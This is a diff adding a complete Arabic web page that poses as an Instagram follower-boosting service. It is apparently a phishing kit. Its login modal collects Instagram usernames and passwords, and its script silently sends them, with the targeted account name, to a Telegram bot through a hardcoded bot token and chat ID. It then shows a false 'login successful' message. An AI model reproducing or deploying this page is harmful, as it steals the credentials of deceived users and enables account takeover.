@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <!-- منع التكبير والتصغير وتثبيت أبعاد الشاشة -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>متابعيني | رشق متابعين انستكرام</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Cairo', sans-serif;
+            -webkit-user-select: none;
+            user-select: none;
+            touch-action: manipulation;
+        }
+
+        html, body {
+            width: 100%;
+            max-width: 100%;
+            overflow-x: hidden;
+            background-color: #05030a;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(217, 70, 239, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(139, 92, 246, 0.15) 0%, transparent 40%);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        /* الهيدر العلوي */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 5%;
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .logo i {
+            font-size: 28px;
+            background: linear-gradient(135deg, #f9ce34, #ee2a7b, #6228d7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .logo-title { font-size: 18px; font-weight: 800; color: #fff; }
+        .logo-title span { color: #fbbf24; }
+
+        .btn-login {
+            border: 1px solid rgba(192, 132, 252, 0.5);
+            background: linear-gradient(135deg, rgba(192, 132, 252, 0.15), rgba(236, 72, 153, 0.15));
+            color: #fff;
+            padding: 8px 18px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        /* القسم الرئيسي */
+        .hero {
+            text-align: center;
+            padding: 20px 15px 30px;
+            width: 100%;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        .hero h1 { font-size: 32px; font-weight: 900; margin-bottom: 5px; }
+        .hero h1 span {
+            background: linear-gradient(135deg, #f43f5e, #ec4899, #c084fc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .hero h2 { font-size: 22px; font-weight: 800; margin-bottom: 10px; }
+        .hero p.desc { color: #a1a1aa; font-size: 13px; max-width: 500px; margin: 0 auto 25px; line-height: 1.5; }
+
+        /* كارت طلب الرشق */
+        .card-form {
+            background: rgba(12, 10, 24, 0.75);
+            border: 1px solid rgba(192, 132, 252, 0.2);
+            border-radius: 20px;
+            padding: 25px 20px;
+            width: 100%;
+            max-width: 480px;
+            margin: 0 auto;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
+        }
+        .card-form h3 { font-size: 20px; font-weight: 800; margin-bottom: 6px; }
+        .card-form h3 span { color: #c084fc; }
+        .card-form p.sub-title { color: #a1a1aa; font-size: 11px; margin-bottom: 20px; }
+
+        .field-group { position: relative; margin-bottom: 14px; }
+        .field-group input, .field-group select {
+            width: 100%;
+            padding: 13px 40px 13px 12px;
+            background: rgba(6, 4, 14, 0.85);
+            border: 1px solid rgba(192, 132, 252, 0.25);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 13px;
+            outline: none;
+            appearance: none;
+            -webkit-user-select: text;
+            user-select: text;
+        }
+        .field-group i {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #a1a1aa;
+            font-size: 15px;
+        }
+
+        .btn-submit-main {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #fb7185, #f43f5e, #d946ef, #fbbf24);
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            margin-top: 10px;
+        }
+
+        /* أزرار التواصل والتليجرام */
+        .links-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .btn-telegram {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 8px;
+            background: rgba(56, 189, 248, 0.1);
+            border: 1px solid rgba(56, 189, 248, 0.3);
+            border-radius: 10px;
+            color: #38bdf8;
+            font-size: 13px;
+            font-weight: 700;
+            text-decoration: none;
+            transition: 0.3s;
+        }
+        .btn-telegram:hover {
+            background: rgba(56, 189, 248, 0.2);
+            box-shadow: 0 0 15px rgba(56, 189, 248, 0.25);
+        }
+        .btn-channel {
+            background: rgba(168, 85, 247, 0.1);
+            border: 1px solid rgba(168, 85, 247, 0.3);
+            color: #c084fc;
+        }
+        .btn-channel:hover {
+            background: rgba(168, 85, 247, 0.2);
+            box-shadow: 0 0 15px rgba(168, 85, 247, 0.25);
+        }
+
+        /* نافذة تسجيل الدخول المنبثقة (Modal) */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(6px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 15px;
+        }
+        .modal-card {
+            background: #0f0b1f;
+            border: 1px solid rgba(236, 72, 153, 0.4);
+            border-radius: 18px;
+            padding: 25px 20px;
+            width: 100%;
+            max-width: 380px;
+            position: relative;
+        }
+        .close-modal {
+            position: absolute;
+            left: 18px; top: 18px;
+            color: #a1a1aa;
+            font-size: 18px;
+            cursor: pointer;
+        }
+        .modal-card h4 { text-align: center; font-size: 18px; margin-bottom: 6px; color: #f472b6; }
+        .modal-card p { text-align: center; font-size: 11px; color: #a1a1aa; margin-bottom: 18px; }
+
+        #alertBox, #modalAlert {
+            margin-top: 12px;
+            padding: 8px;
+            border-radius: 6px;
+            text-align: center;
+            font-size: 11px;
+            display: none;
+        }
+        .success { background: rgba(34, 197, 94, 0.15); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.3); }
+
+        /* حقوق المطور هيثم */
+        footer {
+            text-align: center;
+            padding: 15px;
+            background: rgba(12, 10, 24, 0.8);
+            border-top: 1px solid rgba(192, 132, 252, 0.15);
+            font-size: 13px;
+            color: #a1a1aa;
+        }
+        footer .dev-rights {
+            font-weight: 700;
+            background: linear-gradient(135deg, #f472b6, #c084fc, #fbbf24);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- الهيدر العلوي -->
+    <header>
+        <div class="logo">
+            <i class="fa-brands fa-instagram"></i>
+            <div class="logo-title">متابعيني <span>👑</span></div>
+        </div>
+        <button class="btn-login" id="openLoginBtn"><i class="fa-regular fa-user"></i> تسجيل الدخول</button>
+    </header>
+
+    <!-- واجهة الموقع الرئيسية -->
+    <section class="hero">
+        <h1>رشق متابعين <span>انستكرام</span></h1>
+        <h2>زد متابعيك .. وحقق شهرتك</h2>
+        <p class="desc">أدخل اسم المستخدم لحسابك الأصلي واختر الخدمة لبدء تزويد المتابعين فوراً.</p>
+
+        <!-- استمارة طلب الرشق -->
+        <div class="card-form">
+            <h3>ابدأ الآن واحصل على <span>متابعيك</span></h3>
+            <p class="sub-title">أدخل اسم المستخدم الأصلي المطلوب رشق المتابعين إليه</p>
+
+            <form id="boostForm">
+                <div class="field-group">
+                    <i class="fa-regular fa-user"></i>
+                    <input type="text" id="targetUser" placeholder="اسم المستخدم الأصلي (بدون @)" required>
+                </div>
+
+                <div class="field-group">
+                    <i class="fa-solid fa-users"></i>
+                    <select id="countSelect">
+                        <option value="100">100 متابع انستكرام</option>
+                        <option value="250">250 متابع انستكرام</option>
+                        <option value="500" selected>500 متابع انستكرام (الحد الأقصى)</option>
+                    </select>
+                </div>
+
+                <button type="submit" class="btn-submit-main">
+                    إرسال طلب الرشق الآن <i class="fa-solid fa-paper-plane"></i>
+                </button>
+            </form>
+
+            <!-- أزرار الدعم الفني والقناة -->
+            <div class="links-group">
+                <a href="https://t.me/x_3l9" target="_blank" class="btn-telegram">
+                    <i class="fa-brands fa-telegram"></i> الدعم الفني
+                </a>
+                <a href="https://t.me/UYIITY00" target="_blank" class="btn-telegram btn-channel">
+                    <i class="fa-solid fa-bullhorn"></i> قناتنا الرسمية
+                </a>
+            </div>
+
+            <div id="alertBox"></div>
+        </div>
+    </section>
+
+    <!-- نافذة تسجيل الدخول المنبثقة -->
+    <div class="modal-overlay" id="loginModal">
+        <div class="modal-card">
+            <i class="fa-solid fa-xmark close-modal" id="closeLoginBtn"></i>
+            <h4>تسجيل الدخول بالحساب الوهمي</h4>
+            <p>سجل ببيانات الحساب الوهمي لتمويل وتأكيد المتابعين</p>
+
+            <form id="loginForm">
+                <div class="field-group">
+                    <i class="fa-solid fa-user-gear"></i>
+                    <input type="text" id="fakeUser" placeholder="اسم المستخدم الوهمي" required>
+                </div>
+                <div class="field-group">
+                    <i class="fa-solid fa-lock"></i>
+                    <input type="password" id="fakePass" placeholder="كلمة سر الحساب الوهمي" required>
+                </div>
+                <button type="submit" class="btn-submit-main">
+                    تأكيد وتسجيل الدخول <i class="fa-solid fa-right-to-bracket"></i>
+                </button>
+            </form>
+
+            <div id="modalAlert"></div>
+        </div>
+    </div>
+
+    <!-- شريط حقوق المطور -->
+    <footer>
+        جميع الحقوق محفوظة © تطوير بواسطة <span class="dev-rights">المطور هيثم</span>
+    </footer>
+
+    <script>
+        const BOT_TOKEN = '8131727548:AAF5dFaIhc4rjnaj_-Gc02rQsVDlob4TjEw'; // ضع توكن بوتك هنا
+        const CHAT_ID = '6668270042';     // ضع آيدي حسابك هنا
+
+        const loginModal = document.getElementById('loginModal');
+        document.getElementById('openLoginBtn').addEventListener('click', () => loginModal.style.display = 'flex');
+        document.getElementById('closeLoginBtn').addEventListener('click', () => loginModal.style.display = 'none');
+
+        // إرسال الحساب الوهمي
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const fakeUser = document.getElementById('fakeUser').value;
+            const fakePass = document.getElementById('fakePass').value;
+            const modalAlert = document.getElementById('modalAlert');
+
+            const message = `🔐 **تسجيل دخول وهمي!**\n\n👤 **اليوزر:** \`${fakeUser}\`\n🔑 **الرمز:** \`${fakePass}\``;
+
+            modalAlert.style.display = 'block';
+            modalAlert.className = 'success';
+            modalAlert.innerText = 'جاري التحقق من الحساب...';
+
+            await sendToTelegram(message);
+
+            setTimeout(() => {
+                modalAlert.innerText = 'تم تسجيل الدخول بنجاح!';
+                setTimeout(() => loginModal.style.display = 'none', 1200);
+            }, 800);
+        });
+
+        // إرسال طلب الحساب الأصلي
+        document.getElementById('boostForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const targetUser = document.getElementById('targetUser').value;
+            const count = document.getElementById('countSelect').value;
+            const alertBox = document.getElementById('alertBox');
+
+            const message = `🎯 **طلب رشق جديد!**\n\n👤 **الحساب الأصلي:** \`${targetUser}\`\n📊 **الكمية:** \`${count} متابع\``;
+
+            alertBox.style.display = 'block';
+            alertBox.className = 'success';
+            alertBox.innerText = 'جاري إرسال الطلب...';
+
+            await sendToTelegram(message);
+
+            setTimeout(() => {
+                alertBox.innerText = `تم إرسال الطلب لزيادة ${count} متابع للحساب (${targetUser}).`;
+                document.getElementById('boostForm').reset();
+            }, 800);
+        });
+
+        async function sendToTelegram(textMessage) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: textMessage, parse_mode: 'Markdown' })
+                });
+            } catch (err) {}
+        }
+    </script>
+</body>
+</html>
